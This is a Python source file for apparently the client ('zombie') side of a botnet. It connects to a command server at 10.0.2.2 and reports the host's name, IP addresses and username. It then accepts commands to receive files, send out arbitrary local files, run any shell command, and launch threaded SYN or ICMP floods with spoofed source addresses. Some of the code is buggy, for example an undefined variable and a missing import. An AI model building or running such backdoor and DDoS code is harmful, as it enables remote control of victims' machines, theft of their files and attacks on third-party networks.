import socket
import requests
import platform
import subprocess
import random
import time
from scapy.layers.inet import TCP, ICMP, IP
from scapy.sendrecv import send
from scapy.all import *
import os
import json

def get_zombie_details() :
    details = {
        "pc_name" : socket.gethostname(),
        "private_ip" : socket.gethostbyname(socket.gethostname()),
        "public_ip" : requests.get("https://httpbin.org/ip").json()["origin"],
        "username" : os.getlogin(),
        "os" : platform.system()
    }
    return details

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip=""):
    try:
        source_ip = spoof_ip if spoof_ip else generate_random_ip()
        source_port = RandShort()

        payload = Raw(RandString(size=packet_size))

        if attack_mode == "syn":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='S') / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "icmp":
            packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload / Raw(RandString(size=packet_size))
        send(packet, verbose=False)
    except Exception as e:
        print(f"Error while sending packet: {e}")

ip_address = '10.0.2.2'
port_number = 50000
operating_system = platform.system()

# Create a TCP/IP socket of type stream and IPV4 (because of AF_INET)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
client_socket.connect((ip_address, port_number))

print("Connected to server...")

server_ready = client_socket.recv(1024).decode()
if server_ready == "ready":
    print("Server is ready to receive data...")
    # Send the details of the zombie to the server
    print("Sending zombie details to server...")
    client_socket.sendall(json.dumps(get_zombie_details()).encode())
    print("Zombie details sent to server...")

    while True:
        print("Waiting for command from server...")
        command_to_execute = client_socket.recv(1024).decode()
        print(f"Received command from server: {command_to_execute}")

        if command_to_execute == "quit":
            break
        
        elif command_to_execute.split(" ")[0] == "upload":
            filename = os.path.basename(command_to_execute.split(" ")[1])
            file_size = int(command_to_execute.split(" ")[2])
            upload_path = ""
            if operating_system.lower() == "windows":
                upload_path = fr"C:\Users\AppData\Local\Temp\{filename}" # to fix
            else:
                upload_path = f"/tmp/{filename}"

            with open(upload_path, "wb") as f:
                client_socket.send("ready".encode())
                data = client_socket.recv(file_size)
                f.write(data)
            client_socket.send("File uploaded successfully.".encode())

        elif command_to_execute.split(" ")[0] == "download":
            file_path = command_to_execute.split(" ")[1]

            with open(file_path, "rb") as f:
                client_socket.send(f.read())
        
        elif command_to_execute.split(" ")[0] == "ddos":
            global stop_threads

            command_ls = command_to_execute.split(" ")
            target_ip = command_ls[1]
            target_port = int(command_ls[2])
            number_of_packets = int(command_ls[3])
            packet_size = int(command_ls[4])
            number_of_threads = int(command_ls[5])
            attack_mode = command_ls[6]
            attack_duration = int(command_ls[7])
            spoof_ip = command_ls[8]

            start_time = time.time()
            sent_packets = 0

            def send_packets():
                while True:
                    if sent_packets >= number_of_packets:
                        break
                    if time.time() - start_time >= attack_duration:
                        break

                    send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip)
                    sent_packets += 1
                    print(f"\rSent packet {sent_packets}", end="")

            threads = []
            try:
                for _ in range(number_of_threads):
                    thread = threading.Thread(target=send_packets)
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()
            except Exception as e:
                print(f"Error during attack: {e}")
            finally:
                print("\nAttack completed.")
        else:
            output, error = subprocess.Popen(command_to_execute, 
                                            shell=True, 
                                            stdout=subprocess.PIPE, 
                                            stderr=subprocess.PIPE
                                            ).communicate()
            
            if command_to_execute.startswith("ping"):
                upload_path = ""
                if operating_system.lower() == "windows":
                    upload_path = fr"C:\Users\AppData\Local\Temp\{filename}" # to fix
                else:
                    upload_path = f"/tmp/{filename}"

                with open(upload_path, "r") as f:                    
                    output = f.read().encode()

            if output:
                client_socket.sendall(output)
            else:
                client_socket.sendall(error)
        print("Command output sent to server...")

# Close the socket
client_socket.close()